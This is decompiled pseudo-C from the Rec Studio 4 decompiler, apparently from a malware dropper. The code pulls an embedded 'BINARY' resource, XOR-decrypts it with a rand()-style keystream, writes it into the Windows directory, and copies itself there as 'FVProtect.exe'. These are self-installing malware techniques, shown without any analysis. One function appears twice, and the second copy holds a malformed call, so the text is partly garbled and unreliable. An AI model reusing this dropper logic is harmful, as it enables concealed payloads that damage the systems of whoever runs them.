// Generated by Rec Studio 4 - build Sep 23 2015

signed int L00401000()
{
    signed int _t3;                        // _t3

    _t3 = 2531011 +  *4206824 * 214013;
     *4206824 = _t3;
    return _t3 >> 16 & 32767;
}

L0040101E(
    intOrPtr _a4                           // _cfa_4
)
{
    __eax = _a4;
     *4206824 = __eax;
    return __eax;
}

L00401028(
    signed int __eax,                      // r0
    _unknown_ __ecx,                       // r2
    signed int _a4,                        // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    char _v8;                              // _cfa_fffffff8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t19;                       // _t19
    _unknown_ _t20;                        // _t20
    signed int _t23;                       // _t23
    _unknown_ _t26;                        // _t26
    signed int _t27;                       // _t27
    _unknown_ _t30;                        // _t30
    _unknown_ _t32;                        // _t32

    _push(__ecx);
    _push(_t26);
    _push(_t32);
    _push(_t30);
    _push(0);
    _v8 = 0;
    __imp__GetModuleHandleA();
    _t33 = __eax;
    _push("BINARY");
    _t19 = _a4 & 65535;
    _push(_t19);
    _push(__eax);
    __imp__FindResourceA();
    _t27 = _t19;
    _push(_t27);
    _push(__eax);
    __imp__LoadResource();
    _push(_t19);
    __imp__LockResource();
    _a4 = _t19;
    if(_t19 == 0) {
L2:
        _t20 = 0;
    } else {
        _push(_t27);
        _push(__eax);
        __imp__SizeofResource();
        _push(0);
        _push(128);
        _push(2);
        _push(0);
        _push(0);
        _push(1073741824);
        _push(_a8);
        _t33 = _t19;
        __imp__CreateFileA();
        _a8 = _t19;
        if(_t19 != -1) {
            _t27 = 0;
            if(_t33 > 0) {
                do {
                    _t23 = L00401000();
                    asm("cdq");
                    __edx = _t23 % 256;
                     *(_t27 + _a4) =  *(_t27 + _a4) ^ __dl;
                    _t27 = _t27 + 1;
                } while(_t27 < _t33);
            }
            _push(0);
            _push( &_v8);
            _push(_t33);
            _push(_a4);
            _push(_a8);
            __imp__WriteFile();
            _push(_a8);
            __imp__CloseHandle();
            _t20 = _v8 == _t33;
        } else {
            goto L2;
        }
    }
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t20;
}

L004010DA()
{
    char _v6;                              // _cfa_fffffffa
    char _v1060;                           // _cfa_fffffbdc
    char _v1064;                           // _cfa_fffffbd8
    char _v2120;                           // _cfa_fffff7b8
    char _v3176;                           // _cfa_fffff398
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr* _t23;                        // _t23
    intOrPtr* _t26;                        // _t26

    _push(1024);
    _push( &_v3176);
    _push(0);
    __imp__GetModuleFileNameA();
    _t23 = __imp__GetWindowsDirectoryA;
    _push(1024);
    _push( &_v1060);
     *_t23();
    _push(1024);
    _push( &_v2120);
     *_t23();
    _t26 = __imp__lstrcatA;
    if(_v6 != 92) {
        _push(4206816);
        _push( &_v1060);
         *_t26();
    }
    _push("FVProtect.exe");
    _push( &_v1060);
     *_t26();
    if(_v1064 != 92) {
        _push(4206816);
        _push( &_v2120);
         *_t26();
    }
    _push( *4206592);
    _push( &_v2120);
     *_t26();
    _push( &_v2120);
    _push(101);
    L00401028( &_v2120, __ecx);
    _pop(__ecx);
    _pop(__ecx);
    _push(0);
    _push( &_v1060);
    _push( &_v3176);
    __imp__CopyFileA();
}

L004010DA()
{
    char _v6;                              // _cfa_fffffffa
    char _v1060;                           // _cfa_fffffbdc
    char _v1064;                           // _cfa_fffffbd8
    char _v2120;                           // _cfa_fffff7b8
    char _v3176;                           // _cfa_fffff398
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr* _t23;                        // _t23
    intOrPtr* _t26;                        // _t26

    _push(1024);
    _push( &_v3176);
    _push(0);
    __imp__GetModuleFileNameA();
    _t23 = __imp__GetWindowsDirectoryA;
    _push(1024);
    _push( &_v1060);
     *_t23();
    _push(1024);
    _push( &_v2120);
     *_t23();
    _t26 = __imp__lstrcatA;
    if(_v6 != 92) {
        _push(4206816);
        _push( &_v1060);
         *_t26();
    }
    _push("FVProtect.exe");
    _push( &_v1060);
     *_t26();
    if(_v1064 != 92) {
        _push(4206816);
        _push( &_v2120);
         *_t26();
    }
    _push( *4206592);
    _push( &_v2120);
     *_t26();
    _push( &_v2120);
    _push(101);
    @rec 0x00401028@L00401028@( &_v2120, __ecx);
    _pop(__ecx);
    _pop(__ecx);
    _push(0);
    _push( &_v1060);
    _push( &_v3176);
    __imp__CopyFileA();
}

// Statistics:
//      16 Register nodes
//      43 Temporaries nodes
//       0 Casts
//      60 Statements
//       2 Labels
//       1 Gotos
//       4 Blocks
//     275 Nodes
//       1 Assembly nodes
//      10 Unknown Types


Total time: 0 seconds.
